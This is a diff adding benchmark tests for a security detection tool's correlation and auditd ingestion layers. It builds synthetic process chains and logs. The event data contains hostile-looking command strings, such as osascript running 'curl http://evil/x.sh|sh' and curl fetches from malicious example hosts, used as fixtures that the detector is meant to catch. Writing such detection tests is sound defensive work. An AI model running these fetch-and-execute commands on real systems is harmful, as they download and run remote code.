@@ -524,6 +524,151 @@ def test_rule_loader_performance():
 
 
 # ============================================================================
+# Correlation and Ingestion Benchmarks
+# ============================================================================
+
+def generate_lineage_events(num_chains: int) -> List[Event]:
+    """
+    Generate events forming num_chains osascript to shell to curl lineages.
+
+    Each chain is three linked processes (by pid/ppid) so the correlator
+    has real lineage to walk. Events are interleaved across chains to
+    exercise the per-host tree construction realistically.
+    """
+    base_time = datetime(2026, 7, 11, 10, 0, 0)
+    events = []
+    for c in range(num_chains):
+        root_pid = 100000 + c * 3
+        stages = [
+            ("osascript", "osascript -e do shell script \"curl http://evil/x.sh|sh\"",
+             root_pid, 1, "Terminal"),
+            ("sh", "sh -c curl http://evil/x.sh|sh",
+             root_pid + 1, root_pid, "osascript"),
+            ("curl", f"curl http://evil-{c}.example/x.sh",
+             root_pid + 2, root_pid + 1, "sh"),
+        ]
+        for offset, (proc, cmd, pid, ppid, parent) in enumerate(stages):
+            events.append(Event(
+                timestamp=base_time + timedelta(seconds=c * 10 + offset),
+                platform="macos",
+                process_name=proc,
+                command_line=cmd,
+                user="uid:501",
+                process_id=pid,
+                parent_process_name=parent,
+                parent_process_id=ppid,
+                raw_data={"chain": c},
+            ))
+    return events
+
+
+@pytest.mark.performance
+def test_correlation_throughput():
+    """
+    Benchmark the correlation layer over many lineage chains.
+
+    Builds 1,000 three-stage chains (3,000 events) and correlates them,
+    asserting throughput and that every chain is found.
+    """
+    from core.correlator import Correlator, load_chain_rules
+
+    print("\n" + "=" * 60)
+    print("BENCHMARK: Correlation - 1,000 chains (3,000 events)")
+    print("=" * 60)
+
+    events = generate_lineage_events(1000)
+    correlator = Correlator(load_chain_rules())
+
+    tracemalloc.start()
+    start = time.time()
+    incidents = correlator.correlate(events)
+    elapsed = time.time() - start
+    peak_mem = tracemalloc.get_traced_memory()[1] / 1024 / 1024
+    tracemalloc.stop()
+
+    eps = len(events) / elapsed if elapsed > 0 else 0
+    print(f"\nResults:")
+    print(f"  Events processed: {len(events)}")
+    print(f"  Incidents found: {len(incidents)}")
+    print(f"  Time elapsed: {elapsed:.3f} seconds")
+    print(f"  Events/second: {eps:.1f}")
+    print(f"  Peak memory: {peak_mem:.2f} MB")
+
+    mac_incidents = [i for i in incidents if i.chain_id == "CHAIN-MAC-001"]
+    assert len(mac_incidents) == 1000, "Every lineage chain should correlate"
+    assert elapsed < 5.0, f"Correlation took {elapsed:.3f}s, expected < 5.0s"
+    print(f"\n✓ PASSED")
+
+
+@pytest.mark.performance
+def test_ingestion_throughput():
+    """
+    Benchmark bounded incremental ingestion over a large auditd file.
+
+    Writes 5,000 distinct auditd exec events and ingests them in bounded
+    batches, asserting throughput and bounded memory. A second ingest of
+    the unchanged file must be a no-op (checkpoint honored).
+    """
+    from collectors.linux.collector import LinuxCollector
+    from core.ingest import IngestionService, linux_auditd_parser
+
+    print("\n" + "=" * 60)
+    print("BENCHMARK: Incremental ingestion - 5,000 auditd events")
+    print("=" * 60)
+
+    n = 5000
+    with tempfile.NamedTemporaryFile(suffix=".log", delete=False, mode="w") as f:
+        log_path = f.name
+        for i in range(n):
+            ts = 1642253400.0 + i
+            sid = 10000 + i
+            f.write(
+                f'type=SYSCALL msg=audit({ts}:{sid}): ppid=1234 pid={5000+i} '
+                f'uid=1000 tty=pts0 ses=1 comm="curl" exe="/usr/bin/curl" key=(null)\n'
+                f'type=EXECVE msg=audit({ts}:{sid}): argc=3 a0="curl" a1="-s" '
+                f'a2="http://malicious-{i}.example/x.sh"\n'
+            )
+
+    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as dbf:
+        db_path = dbf.name
+
+    try:
+        db = AlertDatabase(db_path)
+        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
+        parser = linux_auditd_parser(LinuxCollector())
+        service = IngestionService(db, engine, parser, batch_size=500)
+
+        tracemalloc.start()
+        start = time.time()
+        summary = service.ingest_file(log_path)
+        elapsed = time.time() - start
+        peak_mem = tracemalloc.get_traced_memory()[1] / 1024 / 1024
+        tracemalloc.stop()
+
+        eps = summary["events_processed"] / elapsed if elapsed > 0 else 0
+        print(f"\nResults:")
+        print(f"  Events processed: {summary['events_processed']}")
+        print(f"  New alerts: {summary['alerts_new']}")
+        print(f"  Batches: {summary['batches']}")
+        print(f"  Time elapsed: {elapsed:.3f} seconds")
+        print(f"  Events/second: {eps:.1f}")
+        print(f"  Peak memory: {peak_mem:.2f} MB")
+
+        assert summary["events_processed"] == n
+        assert summary["batches"] == 10  # 5000 / 500
+        assert elapsed < 10.0, f"Ingestion took {elapsed:.3f}s, expected < 10.0s"
+
+        # Re-ingest is a no-op thanks to the checkpoint.
+        again = service.ingest_file(log_path)
+        assert again["events_processed"] == 0
+        print(f"  Re-ingest (no-op): {again['events_processed']} events")
+        print(f"\n✓ PASSED")
+    finally:
+        os.unlink(log_path)
+        os.unlink(db_path)
+
+
+# ============================================================================
 # Benchmark Report
 # ============================================================================
 
